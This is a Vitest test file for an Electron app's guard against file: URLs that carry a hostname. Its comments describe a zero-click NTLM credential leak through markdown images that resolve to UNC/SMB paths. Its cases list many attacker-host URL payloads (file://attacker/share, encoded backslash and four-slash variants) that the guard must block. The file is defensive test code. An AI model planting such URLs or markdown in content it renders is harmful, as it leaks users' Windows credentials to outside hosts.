// 安全:拒绝带主机名的 file: 请求(Windows 上即 UNC/SMB 外连 → NTLM 凭据泄露)。
// 攻击:markdown `![](//attacker/share/x.png)` 在 file:// 页面下解析为 file://attacker/share/x.png,
// CSP img-src 'self' 在 file: 页面下放行任意 file: URL(实测),渲染即触发零点击外连。
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  installFileRequestGuard,
  isBlockedFileRequest,
} from '../lib/file-request-policy';

describe('isBlockedFileRequest', () => {
  it('本地 file:///(空 host)放行:应用入口 / macOS / Windows 盘符路径', () => {
    for (const url of [
      'file:///Users/x/out-pack/renderer/index.html',
      'file:///Users/x/a.png',
      'file:///C:/Program%20Files/Continuo/resources/app/index.html',
    ]) {
      expect(isBlockedFileRequest(url)).toBe(false);
    }
  });

  it('带主机名的 file: 请求拒:UNC 外连 / localhost / IP / WebDAV @SSL', () => {
    for (const url of [
      'file://attacker/share/x.png',
      'file://attacker.example.com/share/x.png',
      'file://ATTACKER/share/x.png',
      'file://10.0.0.1/share/x.png',
      'file://attacker@SSL/share/x.png',
      'file://localhost/etc/hosts',
    ]) {
      expect(isBlockedFileRequest(url)).toBe(true);
    }
  });

  it('非 file 协议不处理(交给 CSP / 其它守卫)', () => {
    for (const url of ['https://example.com/x.png', 'http://localhost:5173/', 'data:image/png;base64,AA', 'blob:file:///x']) {
      expect(isBlockedFileRequest(url)).toBe(false);
    }
  });

  it('畸形 authority(WHATWG 解析会抛)→ 仍按非空 host 拒', () => {
    expect(isBlockedFileRequest('file://[bad/x')).toBe(true);
  });

  // 纵深:空 host 但路径以双分隔符开头 / 含编码分隔符 —— 若某层把它还原成 `\\host\share` 即 UNC 外连。
  // (Chromium Windows 下 GURL 通常已把四斜杠规范化成带 host、FileURLToFilePath 也拒 %5C/%2F,本守卫不依赖之。)
  it('空 host 的 UNC 变体拒:四斜杠 / 反斜杠 / 编码反斜杠或斜杠(不分大小写)', () => {
    for (const url of [
      'file:////attacker/share/x.png',
      'file://///attacker/share/x.png',
      'file:///\\\\attacker\\share\\x.png',
      'file:///\\attacker/share',
      'file:///%5C%5Cattacker%5Cshare%5Cx.png',
      'file:///%5c%5cattacker%5cshare%5cx.png',
      'file:///%2F%2Fattacker/share/x.png',
      'file:///Users/x/%2f/a.png',
      'file:///C:/a%5Cb.png',
    ]) {
      expect(isBlockedFileRequest(url), url).toBe(true);
    }
  });

  it('编码分隔符只查路径,不查 query:popout / 窗口 query 里的编码路径照常放行', () => {
    expect(
      isBlockedFileRequest('file:///Users/x/renderer/index.html?workspace=%2FUsers%2Fx%2Frepo&windowSeq=2'),
    ).toBe(false);
    expect(isBlockedFileRequest('file:///Users/x/renderer/index.html#/popout/%2Fpanel')).toBe(false);
    // 合法路径里的 `%25`(字面 %)不是编码分隔符
    expect(isBlockedFileRequest('file:///Users/x/a%252Fb/index.html')).toBe(false);
  });

  it('应用从 UNC 路径运行:与入口同 host 的请求放行(否则自拦白屏),其它 host 仍拒', () => {
    expect(isBlockedFileRequest('file://server/share/app/renderer/index.html', 'server')).toBe(false);
    expect(isBlockedFileRequest('file://SERVER/share/app/renderer/assets/a.js', 'server')).toBe(false);
    expect(isBlockedFileRequest('file://attacker/share/x.png', 'server')).toBe(true);
    // 同 host 也不放过路径变体
    expect(isBlockedFileRequest('file://server//attacker/x.png', 'server')).toBe(true);
    // 入口在本地(空 host)时不因 allowedHost='' 放行任何非空 host
    expect(isBlockedFileRequest('file://attacker/x.png', '')).toBe(true);
  });
});

describe('installFileRequestGuard', () => {
  function install() {
    const onBeforeRequest = vi.fn();
    installFileRequestGuard({ webRequest: { onBeforeRequest } } as never, '/Users/x/renderer/index.html');
    const [filter, listener] = onBeforeRequest.mock.calls[0]! as [
      { urls: string[] },
      (d: { url: string }, cb: (r: { cancel?: boolean }) => void) => void,
    ];
    return { filter, listener };
  }

  it('只对 file: 请求注册,UNC 取消、本地放行', () => {
    const { filter, listener } = install();
    expect(filter.urls).toEqual(['file://*/*']);
    const cb = vi.fn();
    listener({ url: 'file://attacker/share/x.png' }, cb);
    listener({ url: 'file:///Users/x/index.html' }, cb);
    listener({ url: 'file:////attacker/share/x.png' }, cb);
    expect(cb.mock.calls).toEqual([[{ cancel: true }], [{ cancel: false }], [{ cancel: true }]]);
  });

  it('index.ts 在 whenReady 内、首窗创建前对 defaultSession 注册', () => {
    const src = readFileSync(path.join(__dirname, '../index.ts'), 'utf8');
    const ready = src.indexOf('app.whenReady()');
    const reg = src.indexOf('installFileRequestGuard(session.defaultSession, RENDERER_FILE)');
    const firstWin = src.indexOf('createMainWindow({', ready);
    expect(ready).toBeGreaterThan(-1);
    expect(reg).toBeGreaterThan(ready);
    expect(reg).toBeLessThan(firstWin);
  });

  it('主进程别处不得再注册 onBeforeRequest(同 session 同事件后注册会覆盖本守卫)', () => {
    const root = path.join(__dirname, '..');
    const offenders = (readdirSync(root, { recursive: true }) as string[])
      .filter((f) => f.endsWith('.ts') && !f.includes('__tests__') && !f.endsWith('file-request-policy.ts'))
      .filter((f) => readFileSync(path.join(root, f), 'utf8').includes('onBeforeRequest'));
    expect(offenders).toEqual([]);
  });
});
